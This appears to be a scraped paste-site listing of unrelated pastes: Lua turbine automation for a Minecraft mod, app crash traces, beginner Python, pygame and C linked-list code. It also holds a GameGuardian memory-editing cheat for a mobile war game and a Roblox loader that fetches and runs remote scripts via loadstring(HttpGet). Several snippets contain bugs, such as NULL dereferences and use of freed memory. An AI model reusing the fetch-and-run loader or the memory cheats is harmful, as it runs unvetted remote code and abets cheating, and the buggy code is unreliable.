      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{isOpen58}</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{isOpen75}</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{isOpen93}</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{teammember12Is355}</span></td>
    </tr>
    <tr>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">They want to be open with people.</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{wantsTo23}</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{wantsTo59}</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{wantsTo76}</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{wantsTo94}</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{teammember12Wants356}</span></td>
    </tr>
    <tr>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">People are open with them.</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{peopleAre24}</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{peopleAre60}</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{peopleAre77}</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{peopleAre95}</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{peopleAre357}</span></td>
    </tr>
    <tr>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">They want people to be open.</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{hesheWants25}</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{wantsPeople61}</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{wantsPeople78}</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{wantsPeople96}</span></td>
      <td style=""text-align: center;""><span style=""font-size: 12pt;"">{teammember12Wants358}</span></td>
    </tr>
  </tbody>
</table>"
ZEx1hwKf,config.lua,PlatinKinggg,Lua,Thursday 29th of May 2025 10:11:39 AM CDT,"-- Datei: config.lua
-- Konfigurationsdatei für Turbinensteuerung

local config = {}

-- Zeit zwischen Updates in Sekunden
config.updateInterval = 2

-- Schwellenwert (0.0 - 1.0), bei dem die Turbine abschaltet, wenn der Energiespeicher diesen Anteil erreicht
config.energyStopThreshold = 0.95

-- Minimale Rotorgeschwindigkeit, bevor die Induktionspule aktiviert wird
config.rotorMinSpeed = 1300

-- Maximale Rotorgeschwindigkeit, bevor der Durchfluss reduziert wird
config.rotorMaxSpeed = 1800

-- Verhältnis zur Reduktion des Durchflusses (0.0 - 1.0)
config.reducedFlowMultiplier = 0.5

-- Debug-Ausgabe im Terminal aktivieren (1 = an, 0 = aus)
config.debug = 1

return config"
edBzYTzi,gui.lua,PlatinKinggg,Lua,Thursday 29th of May 2025 10:10:21 AM CDT,"-- Datei: gui.lua
-- Ausgabe auf Monitor, Debug-Ausgabe optional im Terminal (CC: Tweaked), modularisiert

local gui = {}
local config = require(""config"")

local monitor = peripheral.find and peripheral.find(""monitor"") or nil

-- Hilfsfunktionen für Terminal
local function termClear()
  term.clear()
end

local function termWriteAt(x, y, text)
  term.setCursorPos(x, y)
  print(text)
end

-- Hilfsfunktionen für Monitor
local function monitorClear()
  if monitor then monitor.clear() end
end

local function monitorWriteAt(x, y, text)
  if monitor then
    monitor.setCursorPos(x, y)
    monitor.write(text)
  end
end

function gui.clear()
  if config.debug == 1 then termClear() end
  monitorClear()
end

function gui.drawCenteredText(y, text)
  if config.debug == 1 then
    local w, _ = term.getSize()
    local x = math.floor((w - #text) / 2)
    termWriteAt(x, y, text)
  end

  if monitor then
    local w, _ = monitor.getSize()
    local x = math.floor((w - #text) / 2)
    monitorWriteAt(x, y, text)
  end
end

function gui.updateMonitor(turbines)
  local turbine = require(""turbine"")

  gui.clear()
  gui.drawCenteredText(1, ""Turbinenstatus"")

  local y = 3
  for i, t in ipairs(turbines) do
    local info = turbine.getTurbineInfo(t)

    local lines = {
      string.format(""Turbine %d:"", i),
      string.format(""  Aktiv: %s"", tostring(info.active)),
      string.format(""  Energie: %d / %d RF"", info.energyStored, info.energyCapacity),
      string.format(""  Flowrate: %d / %d mB/t"", info.fluidFlowRate, info.fluidFlowRateMax),
      string.format(""  Rotor: %d RPM"", info.rotorSpeed),
      string.format(""  RF/t: %.1f"", info.energyProducedLastTick)
    }

    for j, line in ipairs(lines) do
      if config.debug == 1 then termWriteAt(1, y + j - 1, line) end
      monitorWriteAt(1, y + j - 1, line)
    end

    y = y + #lines + 1
  end
end

return gui
"
LxK7rfJz,WC4BAK,ZX_HND,Lua,Thursday 29th of May 2025 10:10:14 AM CDT,"-- Function to draw a line for box formatting
function drawLine()
    return ""==============================""
end

-- Function to format title with a box
function boxTitle(title)
    return drawLine() .. ""\n"" ..
           ""         "" .. title .. ""\n"" ..
           drawLine()
end

-- Main menu for WC4 Unit Modifier
function mainMenu()
    local menuText = boxTitle(""⚔️  WC4 Unit Modifier Menu ⚔️ 21:00"")
    local menu = gg.choice({
        ""🪖 Infantry"",
        ""🛡️ Tank"",
        ""🎯 Artillery"",
        ""♻️ Restore Value""
    }, nil, menuText)

    if menu == 1 then
        infantryMenu()
    elseif menu == 2 then
        tankMenu()
    elseif menu == 3 then
        artilleryMenu()
    elseif menu == 4 then
        restoreFromBackup()
    elseif menu == nil then
        gg.toast(""Menu cancelled."")
        os.exit()
    end
end

-- Submenu for Infantry category
function infantryMenu()
    local menuText = boxTitle(""🪖 Infantry Submenu"")
    local menu = gg.choice({
        "" Light Infantry"",
        "" Assault Infantry"",
        "" Motorized Infantry"",
        "" Mechanized Infantry""
    }, nil, menuText)

    if menu == 1 then
        modifyUnit(""Light Infantry"", ""80D;0D;0D~0D::9"", {-14, 4, 8}) -- unchanged
    elseif menu == 2 then
        modifyUnit(""Assault Infantry"", ""100;4;0::9"", {-14, 4, 8})
    elseif menu == 3 then
        modifyUnit(""Motorized Infantry"", ""120;8;0::9"", {-14, 4, 8})
    elseif menu == 4 then
        modifyUnit(""Mechanized Infantry"", ""140;12;0::9"", {-14, 4, 8})
    elseif menu == nil then
        mainMenu()
    end
end


-- Tank Category
function tankMenu()
    local menuText = boxTitle(""🛡️ Tank Submenu"")
    local menu = gg.choice({
        "" Armored Car"",
        "" Light Tank"",
        "" Medium Tank"",
        "" Heavy Tank"",
        "" Super Tank""
    }, nil, menuText)

    if menu == 1 then
        modifyUnit(""Armored Car"", ""160;18;0::9"", {-14, 4, 8})
    elseif menu == 2 then
        modifyUnit(""Light Tank"", ""200;300;0::9"", {-14, 4, 8})
    elseif menu == 3 then
        modifyUnit(""Medium Tank"", ""245;50;4::9"", {-14, 4, 8})
    elseif menu == 4 then
        modifyUnit(""Heavy Tank"", ""320;80;8::9"", {-14, 4, 8})
    elseif menu == 5 then
        modifyUnit(""Super Tank"", ""650;180;36::9"", {-14, 4, 8})
    elseif menu == nil then
        mainMenu()
    end
end


-- Submenu for Artillery category
function artilleryMenu()
    local menuText = boxTitle(""🎯 Artillery Submenu"")
    local menu = gg.choice({
        "" Field Artillery"",
        "" Howitzer"",
        "" Rocket Artillery"",
        "" Super Artillery""
    }, nil, menuText)

    if menu == 1 then
        modifyUnit(""Field Artillery"", ""160;16;0::9"", {-14, 4, 8})
    elseif menu == 2 then
        modifyUnit(""Howitzer"", ""225;32;4::9"", {-14, 4, 8})
    elseif menu == 3 then
        modifyUnit(""Rocket Artillery"", ""245;45;8::9"", {-14, 4, 8})
    elseif menu == 4 then
        modifyUnit(""Super Artillery"", ""520;90;26::9"", {-14, 4, 8})
    elseif menu == nil then
        mainMenu()
    end
end


-- Verify memory offsets
function verifyOffsets(addr1, addr2, addr3, expectedOffsets)
    local offset1 = addr2 - addr1
    local offset2 = addr3 - addr1
    return (offset1 == expectedOffsets[2] and offset2 == expectedOffsets[3])
end

-- Test modification to verify it's the correct address
-- Test modification to verify it's the correct address
function testModification(group, expectedOffsets, originalValues)
    -- Apply test modification
    local testValue = 999999
    local modified = {
        {address = group[1].address, value = testValue, flags = gg.TYPE_DWORD},
        {address = group[2].address, value = testValue, flags = gg.TYPE_DWORD},
        {address = group[3].address, value = testValue, flags = gg.TYPE_DWORD}
    }
    gg.setValues(modified)

    -- Check if values were actually changed in game
    gg.sleep(500) -- Wait for game to update
    
    local isChanged = true
    for i = 1, 3 do
        local currentValue = gg.getValues({{address = group[i].address, flags = gg.TYPE_DWORD}})[1].value
        if currentValue ~= testValue then
            isChanged = false
            break
        end
    end

    -- Restore original values
    gg.setValues(originalValues)
    gg.clearResults()

    return isChanged
end

-- Function to modify unit values with auto-verification
function modifyUnit(name, searchPattern, expectedOffsets)
    gg.clearResults()
    gg.setRanges(gg.REGION_C_ALLOC)
    gg.searchNumber(searchPattern, gg.TYPE_DWORD)

    local results = gg.getResults(100)
    if #results < 3 then
        gg.alert(name .. "":\n❌ Not enough values found! Only "" .. #results .. "" match(es)."")
        return
    end

    local validGroups = {}
    for i = 1, #results - 2 do
        local addr1 = results[i].address
        local addr2 = results[i + 1].address
        local addr3 = results[i + 2].address

        if verifyOffsets(addr1, addr2, addr3, expectedOffsets) then
            table.insert(validGroups, {
                { address = addr1, value = results[i].value },
                { address = addr2, value = results[i + 1].value },
                { address = addr3, value = results[i + 2].value }
            })
        end
    end

    if #validGroups == 0 then
        gg.alert(name .. "":\n❌ No valid memory groups found with correct offsets!"")
        return
    end

    -- Auto-verification process for multiple matches
    local verifiedGroup = nil
    if #validGroups > 1 then
        gg.toast(""🔍 Found ""..#validGroups.."" groups. Testing one by one..."")
        
        for i, group in ipairs(validGroups) do
            -- Save original values
            local originalValues = {
                {address = group[1].address, value = group[1].value, flags = gg.TYPE_DWORD},
                {address = group[2].address, value = group[2].value, flags = gg.TYPE_DWORD},
                {address = group[3].address, value = group[3].value, flags = gg.TYPE_DWORD}
            }
            
            if testModification(group, expectedOffsets, originalValues) then
                verifiedGroup = group
                gg.toast(""✅ Group ""..i.."" verified - values changed in game!"")
                
                -- Ask for confirmation
                local confirm = gg.alert(name.."":\nGroup ""..i.."" seems correct!\n\n""..
                    ""Addresses:\n0x""..string.format(""%X"", group[1].address)..
                    ""\n0x""..string.format(""%X"", group[2].address)..
                    ""\n0x""..string.format(""%X"", group[3].address)..
                    ""\n\nProceed with modification?"", ""YES"", ""NO"", ""TEST NEXT GROUP"")
                
                if confirm == 1 then -- YES
                    break
                elseif confirm == 2 then -- NO
                    return
                else -- TEST NEXT GROUP
                    verifiedGroup = nil
                    gg.toast(""Testing next group..."")
                end
            else
                gg.toast(""❌ Group ""..i.."" failed verification"")
            end
        end
        
        if not verifiedGroup then
            gg.alert(name.."":\n❌ Couldn't verify any group automatically!\nTry manual selection."")
            return manualGroupSelection(name, validGroups, expectedOffsets)
        end
    else
        verifiedGroup = validGroups[1]
    end

    -- Save to backup file
    local dir = ""/storage/emulated/0/Documents/""
    local savePath = dir .. name:gsub("" "", ""_"") .. ""_cost.txt""

    local file = io.open(savePath, ""w"")
    if file then
        file:write(string.format(""Base Address: 0x%X\n"", verifiedGroup[1].address))
        file:write(string.format(""%d at +0 (0x%X)\n"", verifiedGroup[1].value, verifiedGroup[1].address))
        file:write(string.format(""%d at +4 (0x%X)\n"", verifiedGroup[2].value, verifiedGroup[2].address))
        file:write(string.format(""%d at +8 (0x%X)\n"", verifiedGroup[3].value, verifiedGroup[3].address))
        file:close()
        gg.toast(""✅ Backup saved: "" .. savePath)
    else
        gg.alert(""❌ Failed to save backup to:\n"" .. savePath)
    end

    local modified = {
        { address = verifiedGroup[1].address, value = -9999, flags = gg.TYPE_DWORD },
        { address = verifiedGroup[2].address, value = -9999, flags = gg.TYPE_DWORD },
        { address = verifiedGroup[3].address, value = -9999, flags = gg.TYPE_DWORD }
    }
    gg.setValues(modified)

    gg.alert(""✅ "" .. name .. "" values modified successfully!\nModified addresses:\n0x"" ..
        string.format(""%X"", verifiedGroup[1].address) .. ""\n0x"" ..
        string.format(""%X"", verifiedGroup[2].address) .. ""\n0x"" ..
        string.format(""%X"", verifiedGroup[3].address))
end

function manualGroupSelection(name, groups, expectedOffsets)
    local choices = {}
    for i, group in ipairs(groups) do
        table.insert(choices, string.format(""Group %d:\n0x%X\n0x%X\n0x%X"",
            i, group[1].address, group[2].address, group[3].address))
    end

    local choice = gg.choice(choices, nil, name .. "":\nMultiple matches found. Select group to modify:"")
    if not choice then
        gg.alert(""❗ Operation cancelled."")
        return nil
    end
    
    return groups[choice]
end

function restoreFromBackup()
    gg.setVisible(false)
    gg.alert(""♻️ Unit Value Restoration Tool"")

    local backupFile = gg.prompt(
        {""Select backup file to restore""},
        {""/sdcard/Documents/""},
        {""file""}
    )

    if not backupFile or not backupFile[1] then
        gg.alert(""❌ Restoration cancelled"")
        return
    end

    local file, err = io.open(backupFile[1], ""r"")
    if not file then
        gg.alert(""❌ Failed to open backup file:\n"" .. (err or ""Unknown error""))
        return
    end

    local restoreData = {}
    local baseAddress

    for line in file:lines() do
        if line:match(""Base Address:"") then
            baseAddress = tonumber(line:match(""0x(%x+)""), 16)
        elseif line:match("" at "") then
            local valueStr = line:match(""^(%-?%d+)"")
            local addressStr = line:match(""0x(%x+)"")
            if valueStr and addressStr then
                table.insert(restoreData, {
                    address = tonumber(addressStr, 16),
                    value = tonumber(valueStr),
                    flags = gg.TYPE_DWORD
                })
            end
        end
    end
    file:close()

    if #restoreData ~= 3 or not baseAddress then
        gg.alert(""❌ Invalid backup file format!\nExpected 3 values with base address"")
        return
    end

    gg.toast(""🔄 Restoring values..."")
    local success, err = pcall(gg.setValues, restoreData)
    if not success then
        gg.alert(""❌ Restoration failed:\n"" .. (err or ""Unknown error""))
        return
    end

    local verified = 0
    gg.clearResults()
    for _, data in ipairs(restoreData) do
        gg.searchNumber(data.value, gg.TYPE_DWORD, false, nil, data.address, data.address + 4)
        if gg.getResultsCount() > 0 then
            verified = verified + 1
        end
        gg.clearResults()
    end

    local resultMsg = string.format(
        ""Restoration Results (%d/3):\n\n"" ..
        ""0x%X → %d\n"" ..
        ""0x%X → %d\n"" ..
        ""0x%X → %d"",
        verified,
        restoreData[1].address, restoreData[1].value,
        restoreData[2].address, restoreData[2].value,
        restoreData[3].address, restoreData[3].value
    )

    if verified == 3 then
        gg.alert(""✅ Restoration Complete!\n\n"" .. resultMsg)
    else
        gg.alert(""⚠ Partial Success\n\n"" .. resultMsg)
    end

    gg.setVisible(true)
end

-- Run the script
mainMenu()"
dqaeHStp,orchestrator.lua,PlatinKinggg,Lua,Thursday 29th of May 2025 10:08:22 AM CDT,"-- Datei: orchestrator.lua
-- Hauptsteuerung für mehrere Turbinen (standardisierte API für alle Modvarianten)

local turbine = require(""turbine"")
local gui = require(""gui"")
local config = require(""config"")

local turbines = turbine.getTurbines()

-- Regelwerk zur Bewertung des Zustands
local function evaluate(info)
	local action = {
		shouldActivate = active,
		inductorStatus = info.inductorEngaged,
		flowRate = info.fluidFlowRate		
	}

  -- Abschalten bei vollem Puffer
	if info.energyStored >= info.energyCapacity * config.energyStopThreshold and config.energyForceStop then
		action.shouldActivate = false
		action.flowRate = info.fluidFlowRate




  -- Deaktivierung der Induktionsspulen bei unterschreitung der Roto Mindestgeschwindigkeit
	elseif inductorStatus and info.rotorSpeed < config.rotorMinSpeed then
		action.inductorStatus = false

	elseif inductorStatus and info.rotorSpeed < config.rotorMinSpeed then

  -- Verringern bei zu hoher Rotor-Geschwindigkeit
	elseif info.rotorSpeed > config.rotorMaxSpeed then
		action.flowRate = info.fluidFlowRate * config.reducedFlowMultiplier
	end

	return action
end

-- Hauptprogramm mit paralleler Steuerung und Tastenerkennung
parallel.waitForAny(
	function() -- Turbinensteuerung
		while true do
			for _, t in ipairs(turbines) do
				local info = turbine.getTurbineInfo(t)
				local action = evaluate(info)
        		turbine.setActive(t, action.shouldActivate)
				turbine.setInductorEngaged(t, action.inductorStatus)
				turbine.setFluidFlowRateMax(t, action.flowRate)
			end
		gui.updateMonitor(turbines)
		os.sleep(config.updateInterval)
		end
	end,

	function() -- Tastenerkennung (Delete/Entf-Taste = 211)
		while true do
			local event, key = os.pullEvent(""key"")
			if key == 211 then
				print(""Neustart wird durchgeführt..."")
				os.sleep(1)
				os.reboot()
			end
		end
	end
)"
bHCyJny5,start.lua,PlatinKinggg,Lua,Thursday 29th of May 2025 09:58:07 AM CDT,"-- Datei: start.lua
-- Lädt die modabhängige Turbinensteuerung + GUI für CC: Tweaked mit effizientem Auto-Update

-- Mod-Erkennung über Peripherie
local function getModType()
  for _, name in ipairs(peripheral.getNames()) do
    local ptype = peripheral.getType(name)
    if ptype == ""BigReactors-Turbine"" then
      return ""BigReactors""
    elseif ptype == ""ExtremeReactors2-Turbine"" then
      return ""ExtremeReactors""
    elseif ptype == ""BiggerReactors-Turbine"" then
      return ""BiggerReactors""
    end
  end
  
  term.setTextColor(colors.red)
  print(""Kein unterstützter Reaktor-Mod gefunden!"")
  print(""Programm wird gestoppt und der CC-Computer in 15 Sekunden heruntergefahren"")
  print(""Bitte Fehler beheben und CC-Computer neustarten!"")
  sleep(15)
  os.shutdown()
end

-- Pastebin-Links
local pastebinLinks = {
  BigReactors = {
    turbine = ""8xx3Ns3u"" -- turbine_br.lua
  },
  ExtremeReactors = {
    turbine = ""<PASTEBIN_KEY_ER>""
  },
  BiggerReactors = {
    turbine = ""<PASTEBIN_KEY_BGR>""
  },
  common = {
    gui = ""edBzYTzi"",
    main = ""dqaeHStp"",
    config = ""ZEx1hwKf""
  }
}

-- Lädt Datei einmal herunter und gibt Inhalt zurück
local function downloadToMemory(pasteKey, targetTmp)
  shell.run(""pastebin get "" .. pasteKey .. "" "" .. targetTmp)
  local f = fs.open(targetTmp, ""r"")
  local content = f.readAll() or """"
  f.close()
  return content
end

-- Datei ggf. aktualisieren (aber lädt Paste nur einmal)
local function updateFileIfNeeded(pasteKey, filename)
  local tmpFile = "".tmp""
  local newContent = downloadToMemory(pasteKey, tmpFile)
  local oldContent = """"

  if fs.exists(filename) then
    local f = fs.open(filename, ""r"")
    oldContent = f.readAll() or """"
    f.close()
  end

  if oldContent ~= newContent then
    term.setTextColor(colors.yellow)
    print(""Aktualisiere "" .. filename .. "" ..."")
    term.setTextColor(colors.white)
    if fs.exists(filename) then fs.delete(filename) end
    fs.copy(tmpFile, filename)
  else
    term.setTextColor(colors.green)
    print(filename .. "" ist aktuell."")
    term.setTextColor(colors.white)
  end

  fs.delete(tmpFile)
end

-- Hauptlogik
term.setTextColor(colors.yellow)
print(""Prüfe auf vorhandene Reaktor- oder Turbinenversion..."")
term.setTextColor(colors.white)
local modType = getModType()
print(""Mod erkannt: "" .. modType)
local links = pastebinLinks[modType]
local common = pastebinLinks.common

-- Gemeinsame Dateien prüfen und ggf. updaten
updateFileIfNeeded(common.gui, ""gui"")
updateFileIfNeeded(common.main, ""orchestrator"")
updateFileIfNeeded(common.config, ""config"")
-- Mod-spezifische Datei prüfen und ggf. updaten
updateFileIfNeeded(links.turbine, ""turbine"")

-- Starte Programm
term.setTextColor(colors.yellow)
print(""Steuerung wird gestartet..."")
term.setTextColor(colors.white)
sleep(3)
shell.run(""orchestrator"")"
AKSTrcce,2025-05-29T16:57:54.288416,powerampache,PHP,Thursday 29th of May 2025 09:57:55 AM CDT,"1.01-80-play (80) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""Unable to resolve host ""cloud.freilicht-theater.de"": No address associated with hostname"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1156)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:651)
	at java.lang.Thread.run(Thread.java:1119)

"
8xx3Ns3u,turbine_br.lua,PlatinKinggg,Lua,Thursday 29th of May 2025 09:55:39 AM CDT,"-- Datei: turbine_br.lua
-- Turbinenfunktionen für Big Reactors unter CC: Tweaked

local peripheral = peripheral
local turbine = {}

function turbine.getTurbines()
  local turbines = {}
  for _, name in ipairs(peripheral.getNames()) do
    if peripheral.getType(name) == ""BigReactors-Turbine"" then
      table.insert(turbines, peripheral.wrap(name))
    end
  end
  return turbines
end

function turbine.getTurbineInfo(t)
  return {
    active = t.getActive(),
    connected = t.getConnected(),
    assembled = t.getMultiblockAssembled(),
    energyStored = t.getEnergyStored(),
    energyCapacity = t.getEnergyCapacity(),
    energyProducedLastTick = t.getEnergyProducedLastTick(),
    fluidAmountMax = t.getFluidAmountMax(),
    fluidFlowRate = t.getFluidFlowRate(),
    fluidFlowRateMax = t.getFluidFlowRateMax(),
    fluidFlowRateMaxMax = t.getFluidFlowRateMaxMax(),
    inductorEngaged = t.getInductorEngaged(),
    inputAmount = t.getInputAmount(),
    inputType = t.getInputType(),
    outputAmount = t.getOutputAmount(),
    outputType = t.getOutputType(),
    rotorSpeed = t.getRotorSpeed(),
    bladeEfficiency = t.getBladeEfficiency(),
    rotorMass = t.getRotorMass(),
    numberOfBlades = t.getNumberOfBlades()
  }
end

function turbine.setActive(t, state)
  t.setActive(state)
end

function turbine.setFluidFlowRateMax(t, rate)
  t.setFluidFlowRateMax(rate)
end

return turbine"
mbRc8pS7,TextDivider,slavi146,Python,Thursday 29th of May 2025 08:38:03 AM CDT,"def word_counter(text):
    word_count = {}
    textwords = text.lower().split()
    for word in textwords:
        word = """".join(char for char in word if char.isalpha())
        if word.isalpha():
            if word in word_count:
                word_count[word] += 1
            else:
                word_count[word] = 1
        else:
            try:
                raise ValueError(""Input must be only string!"")
            except ValueError:
                print(""Everything is fine."")
    return word_count
text = input('Enter the tex you want to get divided by words here-->')

dict = word_counter(text)
for i, j in dict.items():
    print(f'{i}:{j}')

with open('rechnik s dumi i tehniq broi', 'w') as f:
    for i, j in dict.items():
        f.write(f'{i}:{j}\n')

setwithvalues = set(dict.values())
print(f'Every value from the dict: {setwithvalues}')


list_words = list(dict.keys())
print(f'Words used in the text: {list_words}')

"
8y4MrqfW,2025-05-29T21:30:36.812636,powerampache,PHP,Thursday 29th of May 2025 08:30:36 AM CDT,"1.01-80 (80) - DB: 83
java.lang.NullPointerException: Parameter specified as non-null is null: method luci.sixsixsix.powerampache2.domain.models.User.<init>, parameter id
	at luci.sixsixsix.powerampache2.domain.models.User.<init>(Unknown Source:20)
	at luci.sixsixsix.powerampache2.data.remote.dto.UserDtoKt.toUser(UserDto.kt:94)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository.getUserNetwork(BaseAmpacheRepository.kt:128)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository$getUserNetwork$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at kotlinx.coroutines.scheduling.CoroutineScheduler.runSafely(CoroutineScheduler.kt:584)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.executeTask(CoroutineScheduler.kt:811)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.runWorker(CoroutineScheduler.kt:715)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.run(CoroutineScheduler.kt:702)

"
vu1TiENb,2025-05-29T10:24:29.968800,powerampache,PHP,Thursday 29th of May 2025 08:24:39 AM CDT,"1.01-80-play (80) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""Unable to resolve host ""umbrel.tail94509.ts.net"": No address associated with hostname"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

"
iup6bmxY,MM2,sidedosito,Lua,Thursday 29th of May 2025 08:00:53 AM CDT,"loadstring(game:HttpGet(""https://raw.githubusercontent.com/Joystickplays/psychic-octo-invention/main/yarhm.lua"", false))()

loadstring(game:HttpGet('https://pastebin.com/raw/UYqrm7T3'))()"
pkEJ4iym,game,black_duck11,Python,Thursday 29th of May 2025 07:45:56 AM CDT,"import pygame
pygame.init()#inicjalizacja modułu

SZEROKOSC=800
WYSOKOSC=600
#tworzenie ekranu o określonych wymiarach
ekran=pygame.display.set_mode((SZEROKOSC,WYSOKOSC))
#nadanie oknu nazwy
pygame.display.set_caption('Pierwsza gra')
zegar=pygame.time.Clock()
def load_image(sciezka_do_pliku, pozycja):
    #surface-powierzchnia dla grafiki
    image=pygame.image.load(sciezka_do_pliku)
    surface=image.convert()
    #pozycja wyświetlania obiektu jest zapisana w rect
    rect=surface.get_rect(center=pozycja)
    return [surface,rect]#lista 
def wyswietl_grafike(lista):
    #blit(powierzchnia, pozycja)- funkcja, wyświetlająca obiekty na ekranie
    ekran.blit(lista[0], lista[1])
def ustaw_pozycje(lista, nowa_pozycja):
    surface,rect=lista# rect to aktualna pozycja
    rect=surface.get_rect(center=nowa_pozycja)
    return [surface,rect]
def oblicz_ruch_gracza(klawisze):
    predkosc=10
    delta_x=0
    delta_y=0
    if klawisze[pygame.K_a]:
        delta_x-=predkosc
    if klawisze[pygame.K_d]:
        delta_x+=predkosc
    if klawisze[pygame.K_w]:
        delta_y-=predkosc
    if klawisze[pygame.K_s]:
        delta_y+=predkosc
    return [delta_x,delta_y]


pozycja_gracza=[SZEROKOSC//2, WYSOKOSC//2]
gracz=load_image('player.png', pozycja_gracza)


#zmienna, która określa czy gra działa
status_gry=True
while status_gry:
        #pobieranie wszystkich zarejestrowanych zdarzeń
    zdarzenia=pygame.event.get()
    for zdarzenie in zdarzenia:
        #sprawdzenie czy kliknięto na X
        if zdarzenie.type==pygame.QUIT:
            status_gry=False
        elif zdarzenie.type==pygame.KEYDOWN:
            if zdarzenie.key==pygame.K_ESCAPE:
                status_gry=False
    wcisniete_klawisze=pygame.key.get_pressed()
    #odczytujemy dane która zwraca funckja  oblicz_ruch_gracza
    delta_x,delta_y=oblicz_ruch_gracza(wcisniete_klawisze)
    pozycja_gracza[0]+=delta_x
    pozycja_gracza[1]+=delta_y
    gracz=ustaw_pozycje(gracz,pozycja_gracza)


    ekran.fill([0,0,0])
    #print(wcisniete_klawisze)
    wyswietl_grafike(gracz)
     #odświeżenie okna
    pygame.display.update()
    zegar.tick(60)

pygame.quit()"
9ZHe0ePs,Linked List,-nodo-,C,Thursday 29th of May 2025 07:31:15 AM CDT,"#include <stdio.h>
#include <stdlib.h>

typedef struct node {
    int value;
    struct node *next;
} node;

void print_list(node *head) {
    while (head != NULL) {
        printf(""%d -> "", head->value);
        head = head->next;
    }
    printf(""NULL\n"");
}

node *insert_head(node *head, int val) {
    node *new = malloc(sizeof(node));
    new->next = head;
    new->value = val;
    return new;
}

void in_order_insert(node **head, int val) {
    node *new = malloc(sizeof(node));
    node **curr = head;
    node **prev = NULL;

    while (*curr && val > (*curr)->value) {
        prev = curr;
        curr = &((*curr)->next);
    }

    (*prev)->next = new;
    new->next = *curr;
}

// void in_order_insert(node **head, int val) {
//     node *new = malloc(sizeof(node));
//     node **prev = NULL;
//     node *curr = *head;

//     new->next = NULL;
//     new->value = val;

//     if (!*head) {
//         *head = new;
//         return;
//     }

//     // printf(""looping"");
//     while (curr && val > curr->value) {
//         *prev = curr;
//         curr = curr->next;
//     }

//     (*prev)->next = new;
//     new->next = curr;

//     // return head;
    
//     // printf(""insert at:%d\n"", curr->value);
// }

void append(node **head, int val) {
    node *new = malloc(sizeof(node)), **it;
    new->next = NULL;
    new->value = val;

    for (it = head; *it; it = &(*it)->next);
    *it = new;
}

void reverse(node **head) {
    node *prev = NULL;
    node *curr = *head;
    node *next;

    while (curr != NULL) {
        next = curr->next;
        curr->next = prev;
        prev = curr;
        curr = next; 
    }

    *head = prev;
}

node *find(node *list, int key) {
    while (list && list->value != key)
        list = list->next;
    return list;
}

node *delete_list(node *list, node *target) {
    if (list == target) {
        return list->next;
    }

    node *prev = NULL;

    while (list != target) {
        prev = list;
        list = list->next;
    }

    prev->next = list->next;
    free(list);

    return list;
}

void free_list(node *list) {
    node *next;

    while (list != NULL) {
        printf(""deleting: %d\n"", list->value);
        next = list->next;
        free(list);
        list = next;
    }
}

int main() {
    node *list = NULL;

    append(&list, 99);
    list = insert_head(list, 10);
    list = insert_head(list, 20);
    print_list(list);

    reverse(&list);

    list = delete_list(list, find(list, 99));

    in_order_insert(&list, 15);

    print_list(list);

    free_list(list);

    return 0;
}

void insert_item_end ( node ** head , int val ) {
node * temp = malloc ( sizeof ( node ) ) ;
if (! temp ) return ;
temp -> value = val ;
temp -> next = NULL ;
if (* head ) {
node * ele = * head ;
for( ; ele -> next ; ele = ele -> next ) ;
ele -> next = temp ;
}
else
* head = temp ;
}

void append1(node *head, int val) {
    node *new = malloc(sizeof(node));
    new->next = NULL;
    new->value = val;

    while (head->next != NULL)
        head = head->next;

    head->next = new;
}

void append2(node **head, int val) {
    node *new = malloc(sizeof(node));
    new->next = NULL;
    new->value = val;

    if (!*head) {
        *head = new;
        return;
    }

    node *it = *head;

    while (it->next != NULL)
        it = it->next;

    it->next = new;
}

void append3(node **head, int val) {
    node *new = malloc(sizeof(node));
    new->next = NULL;
    new->value = val;
    
    node **it = head;
    while (*it != NULL)
        it = &((*it)->next); // it = &(**it).next;

    *it = new;
}
